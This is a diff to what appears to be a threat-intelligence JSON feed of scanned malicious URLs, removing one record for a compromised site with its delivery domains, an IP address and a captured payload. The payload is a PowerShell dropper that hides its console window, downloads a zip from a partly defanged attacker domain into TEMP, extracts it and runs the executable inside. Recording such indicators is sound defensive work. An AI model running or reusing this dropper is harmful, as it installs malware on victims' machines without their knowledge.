@@ -353,34 +353,5 @@
     "ResolvedDownloadUrl": [],
     "ReportId": "cmwyceukd0gn60omlmkcltw7a",
     "ScannedAt": "2026-11-27T02:09:02.857000+00:00"
-  },
-  {
-    "UrlDomain": "wpmagazam.com.tr",
-    "DeliveryUrl": [
-      "browse-login.info",
-      "secuius.com"
-    ],
-    "PayloadUrl": [
-      "https://secuius.com/yIY"
-    ],
-    "IP": [
-      "104.21.69.181"
-    ],
-    "Related": [
-      {
-        "Value": "https://secuius.com/tk.js?ver=1.0.1",
-        "Type": "Reference"
-      },
-      {
-        "Value": "https://browse-login.info/api.php?s=6d61d3c4f0ecf193c89fbb37ccc86999b416c0289e00584d&amp;_v=29929017",
-        "Type": "Reference"
-      }
-    ],
-    "Payload": "$url = \"https://secuius[.]com/yIY\";\n$filename = \"Franz.exe\";\n$path = \"$env:TEMP\";\n$archive = Join-Path $path \"d19JSWg2.zip\";\n$filepath = Join-Path $path $filename;\n$signature = @\"\nusing System;\nusing System.Runtime.InteropServices;\npublic class Win32 {\n\t[DllImport(\"kernel32.dll\")]\n\tpublic static extern IntPtr GetConsoleWindow();\n\t[DllImport(\"user32.dll\")]\n\tpublic static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);\n}\n\"@;\nAdd-Type $signature;\n$hwnd = [Win32]::GetConsoleWindow();\nif($hwnd -ne [IntPtr]::Zero)\n{\n\t[Win32]::ShowWindow($hwnd, 0);\n}\nNew-Item -Path $path -ItemType Directory -Force;\ncurl $url -o $archive;\nExpand-Archive -Path $archive -DestinationPath $path -Force;\nRemove-Item $archive -Force;\nStart-Process $filepath;\nexit",
-    "ResolvedDownloadUrl": [
-      "https://secuius.com/yIY"
-    ],
-    "ReportId": "cmwy9vogu0gk80omlqmmdiw5j",
-    "ScannedAt": "2026-11-27T00:58:09.268000+00:00"
   }
 ]
